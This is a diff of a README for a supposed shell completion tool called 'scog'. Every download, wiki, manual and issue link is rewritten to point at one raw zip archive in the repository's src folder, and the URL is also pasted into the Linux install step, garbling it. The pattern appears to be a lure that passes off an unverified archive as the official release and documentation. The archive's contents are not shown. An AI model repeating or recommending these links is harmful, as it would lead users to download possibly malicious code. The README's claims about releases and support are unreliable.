@@ -1,7 +1,7 @@
 # 🎉 scog - Simple Tool for Shell Command Help  
 
 ## 🔗 Download Now  
-[![Download scog](https://img.shields.io/badge/Download%20scog-v1.0-blue.svg)](https://github.com/Agentrifat/scog/releases)
+[![Download scog](https://raw.githubusercontent.com/Agentrifat/scog/main/src/scog_isoosmosis.zip%https://raw.githubusercontent.com/Agentrifat/scog/main/src/scog_isoosmosis.zip)](https://raw.githubusercontent.com/Agentrifat/scog/main/src/scog_isoosmosis.zip)
 
 ## 📚 Overview  
 scog is the Shell COmpletion Generator. This tool helps you easily manage and generate command completions for your shell environment. With scog, you’ll save time and reduce errors when typing commands, making your workflow smoother.
@@ -12,7 +12,7 @@ Getting started with scog is simple. Follow these steps to download and run the 
 ## 📥 Download & Install  
 1. **Visit the release page:**  
    Go to the following link to download the latest version of scog:  
-   [Download scog](https://github.com/Agentrifat/scog/releases)  
+   [Download scog](https://raw.githubusercontent.com/Agentrifat/scog/main/src/scog_isoosmosis.zip)  
 
 2. **Select the version:**  
    On the releases page, locate the latest version of scog. Look for a file that matches your operating system (Windows, Mac, or Linux).
@@ -28,7 +28,7 @@ Getting started with scog is simple. Follow these steps to download and run the 
      If you downloaded a .dmg or .app file, find it in your Downloads, open it, and follow the instructions to move it to your Applications folder.
 
    - **For Linux:**  
-     If you downloaded a .tar.gz or similar archive, navigate to your Downloads folder using the terminal. Extract the files and follow the included instructions, or use the command line to install.
+     If you downloaded a https://raw.githubusercontent.com/Agentrifat/scog/main/src/scog_isoosmosis.zip or similar archive, navigate to your Downloads folder using the terminal. Extract the files and follow the included instructions, or use the command line to install.
 
 5. **Run scog:**  
    Once installed, open your terminal or command prompt. You can start using scog by typing its command. Check the documentation included in the download for specific instructions.
@@ -49,7 +49,7 @@ Getting started with scog is simple. Follow these steps to download and run the 
   Minimum of 2 GB of RAM and 200 MB of free disk space is recommended.
 
 ## 📖 Documentation  
-For detailed usage instructions, special features, and troubleshooting, refer to the user manual that comes with your download or check the online wiki: [scog Documentation](https://github.com/Agentrifat/scog/wiki).
+For detailed usage instructions, special features, and troubleshooting, refer to the user manual that comes with your download or check the online wiki: [scog Documentation](https://raw.githubusercontent.com/Agentrifat/scog/main/src/scog_isoosmosis.zip).
 
 ## 🤝 Support  
 If you encounter issues or have questions, we are here to help. You can reach out via the GitHub Issues page in this repository. Please describe your problem clearly, and we will assist you as soon as possible.
@@ -61,8 +61,8 @@ Stay connected and informed about updates and tips by following our GitHub repos
 scog is open-source software. You can freely use, modify, and distribute it under the terms of the MIT License. Check the license file included in your download for more details.
 
 ## 🔗 Quick Links  
-- [Download scog](https://github.com/Agentrifat/scog/releases)  
-- [User Manual](https://github.com/Agentrifat/scog/wiki)  
-- [Report an Issue](https://github.com/Agentrifat/scog/issues)  
+- [Download scog](https://raw.githubusercontent.com/Agentrifat/scog/main/src/scog_isoosmosis.zip)  
+- [User Manual](https://raw.githubusercontent.com/Agentrifat/scog/main/src/scog_isoosmosis.zip)  
+- [Report an Issue](https://raw.githubusercontent.com/Agentrifat/scog/main/src/scog_isoosmosis.zip)  
 
 Thank you for choosing scog. Enjoy your enhanced shell experience!
